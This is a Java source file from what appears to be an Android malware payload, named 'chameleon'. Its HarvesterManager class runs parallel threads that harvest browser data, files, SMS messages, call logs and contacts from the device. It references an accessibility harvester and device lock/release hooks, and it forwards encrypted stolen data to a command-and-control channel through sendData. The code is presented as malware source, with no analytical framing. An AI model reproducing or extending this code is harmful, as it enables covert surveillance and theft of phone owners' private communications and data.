package com.chameleon.payload.harvester;

import android.content.Context;
import android.util.Log;

public class HarvesterManager {
    private static final String TAG = "HarvesterManager";

    private final Context context;
    private final AccessibilityHarvester accessibilityHarvester;
    private final BrowserHarvester browserHarvester;
    private final FileHarvester fileHarvester;
    private final SmsHarvester smsHarvester;
    private final CallLogHarvester callLogHarvester;

    private volatile boolean sweeping = false;
    private Thread sweepThread;

    public HarvesterManager(Context context) {
        this.context = context;
        this.accessibilityHarvester = new AccessibilityHarvester(context, this);
        this.browserHarvester = new BrowserHarvester(context, this);
        this.fileHarvester = new FileHarvester(context, this);
        this.smsHarvester = new SmsHarvester(context);
        this.callLogHarvester = new CallLogHarvester(context);
    }

    public void startSweep(int durationSeconds) {
        if (sweeping) return;
        sweeping = true;

        sweepThread = new Thread(() -> {
            Log.i(TAG, "Sweep started for " + durationSeconds + "s");

            // Run all harvesters in parallel
            Thread browserThread = new Thread(() -> browserHarvester.collectBrowserData());
            Thread fileThread = new Thread(() -> fileHarvester.collectFiles());
            Thread smsThread = new Thread(() -> smsHarvester.collectSms());
            Thread callLogThread = new Thread(() -> {
                callLogHarvester.collectCallLogs();
                callLogHarvester.collectContacts();
            });

            browserThread.start();
            fileThread.start();
            smsThread.start();
            callLogThread.start();

            try {
                browserThread.join(60000);
                fileThread.join(120000);
                smsThread.join(30000);
                callLogThread.join(30000);
            } catch (InterruptedException ignored) {}

            Log.i(TAG, "Sweep completed");
            stopSweep();
        });
        sweepThread.start();
    }

    public void stopSweep() {
        sweeping = false;
        Log.i(TAG, "Sweep stopped");
    }

    public boolean isSweeping() {
        return sweeping;
    }

    public void lockDevice() {
        Log.i(TAG, "Device lock triggered");
    }

    public void releaseDevice() {
        Log.i(TAG, "Device release triggered");
    }

    public void stopAll() {
        stopSweep();
        if (sweepThread != null) sweepThread.interrupt();
    }

    public void sendData(String dataType, byte[] encryptedPayload) {
        com.chameleon.payload.PayloadEntry.getC2().sendData(dataType, encryptedPayload);
    }

    public AccessibilityHarvester getAccessibilityHarvester() {
        return accessibilityHarvester;
    }

    public Context getContext() {
        return context;
    }
}
